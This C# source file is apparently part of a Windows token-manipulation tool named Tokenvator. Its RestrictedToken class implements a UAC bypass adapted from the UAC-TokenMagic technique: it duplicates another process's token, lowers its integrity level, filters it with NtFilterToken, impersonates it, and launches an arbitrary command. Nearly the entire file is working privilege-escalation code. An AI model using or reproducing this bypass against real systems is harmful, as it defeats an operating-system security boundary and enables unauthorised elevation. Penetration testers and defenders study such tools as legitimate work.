using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Principal;
using System.Text;

namespace Tokenvator
{
    class RestrictedToken : Tokens
    {
        IntPtr luaToken;

        internal RestrictedToken() : base(false)
        {
            luaToken = new IntPtr();
            Console.WriteLine(" [+] Running as: {0}", WindowsIdentity.GetCurrent().Name);
        }

        ////////////////////////////////////////////////////////////////////////////////
        //https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/UAC-TokenMagic.ps1
        ////////////////////////////////////////////////////////////////////////////////
        public Boolean BypassUAC(Int32 processId, String command)
        {
            if (GetPrimaryToken((UInt32)processId))
            {
                if (SetTokenInformation())
                {
                    if (ImpersonateUser())
                    {
                        if (CreateProcess.CreateProcessWithLogonW(phNewToken, command, ""))
                        {
                            advapi32.RevertToSelf();
                            return true;
                        }
                    }
                    advapi32.RevertToSelf();
                }
            }
            return false;
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        public Boolean GetPrimaryToken(UInt32 processId)
        {
            //Originally Set to true
            IntPtr hProcess = kernel32.OpenProcess(Constants.PROCESS_QUERY_LIMITED_INFORMATION, false, processId);
            if (hProcess == IntPtr.Zero)
            {
                Console.WriteLine(" [-] Unable to Open Process Token: {0}", processId);
                return false;
            }
            Console.WriteLine("[+] Recieved Handle for: {0}", processId);
            Console.WriteLine(" [+] Process Handle: {0}", hProcess.ToInt32());

            if (!kernel32.OpenProcessToken(hProcess, (UInt32)Enums.ACCESS_MASK.MAXIMUM_ALLOWED, out hExistingToken))
            {
                Console.WriteLine(" [-] Unable to Open Process Token: {0}", hProcess.ToInt32());
                return false;
            }
            Console.WriteLine(" [+] Primary Token Handle: {0}", hExistingToken.ToInt32());
            kernel32.CloseHandle(hProcess);

            Structs._SECURITY_ATTRIBUTES securityAttributes = new Structs._SECURITY_ATTRIBUTES();
            if (!advapi32.DuplicateTokenEx(
                        hExistingToken,
                        (UInt32)(Constants.TOKEN_ALL_ACCESS),
                        ref securityAttributes,
                        Enums._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                        Enums.TOKEN_TYPE.TokenPrimary,
                        out phNewToken
            ))
            {
                GetError("DuplicateTokenEx: ");
                return false;
            }
            Console.WriteLine(" [+] Existing Token Handle: {0}", hExistingToken.ToInt32());
            Console.WriteLine(" [+] New Token Handle: {0}", phNewToken.ToInt32());
            kernel32.CloseHandle(hExistingToken);
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        public Boolean SetTokenInformation()
        {
            Structs.SidIdentifierAuthority pIdentifierAuthority = new Structs.SidIdentifierAuthority();
            pIdentifierAuthority.Value = new byte[] { 0x0, 0x0, 0x0, 0x0, 0x0, 0x10 };
            byte nSubAuthorityCount = 1;
            IntPtr pSID = new IntPtr();
            if (!advapi32.AllocateAndInitializeSid(ref pIdentifierAuthority, nSubAuthorityCount, 0x2000, 0, 0, 0, 0, 0, 0, 0, out pSID))
            {
                GetError("AllocateAndInitializeSid: ");
                return false;
            }

            Console.WriteLine(" [+] Initialized SID : {0}", pSID.ToInt32());

            Structs.SID_AND_ATTRIBUTES sidAndAttributes = new Structs.SID_AND_ATTRIBUTES();
            sidAndAttributes.Sid = pSID;
            sidAndAttributes.Attributes = Constants.SE_GROUP_INTEGRITY_32;

            Structs.TOKEN_MANDATORY_LABEL tokenMandatoryLabel = new Structs.TOKEN_MANDATORY_LABEL();
            tokenMandatoryLabel.Label = sidAndAttributes;
            Int32 tokenMandatoryLableSize = Marshal.SizeOf(tokenMandatoryLabel);
            
            if (0 != ntdll.NtSetInformationToken(phNewToken, 25, ref tokenMandatoryLabel, tokenMandatoryLableSize))
            {
                GetError("NtSetInformationToken: ");
                return false;
            }
            Console.WriteLine(" [+] Set Token Information : {0}", phNewToken.ToInt32());

            Structs._SECURITY_ATTRIBUTES securityAttributes = new Structs._SECURITY_ATTRIBUTES();
            if (0 != ntdll.NtFilterToken(phNewToken, 4, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref luaToken))
            {
                GetError("NtFilterToken: ");
                return false;
            }
            Console.WriteLine(" [+] Set LUA Token Information : {0}", luaToken.ToInt32());
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        public Boolean ImpersonateUser()
        {
            Structs._SECURITY_ATTRIBUTES securityAttributes = new Structs._SECURITY_ATTRIBUTES();
            if (!advapi32.DuplicateTokenEx(
                        luaToken,
                        (UInt32)(Constants.TOKEN_IMPERSONATE | Constants.TOKEN_QUERY),
                        ref securityAttributes,
                        Enums._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                        Enums.TOKEN_TYPE.TokenImpersonation,
                        out phNewToken
            ))
            {
                GetError("DuplicateTokenEx: ");
                return false;
            }
            Console.WriteLine(" [+] Duplicate Token Handle : {0}", phNewToken.ToInt32());
            if (!advapi32.ImpersonateLoggedOnUser(phNewToken))
            {
                GetError("ImpersonateLoggedOnUser: ");
                return false;
            }
            return true;
        }
    }
}
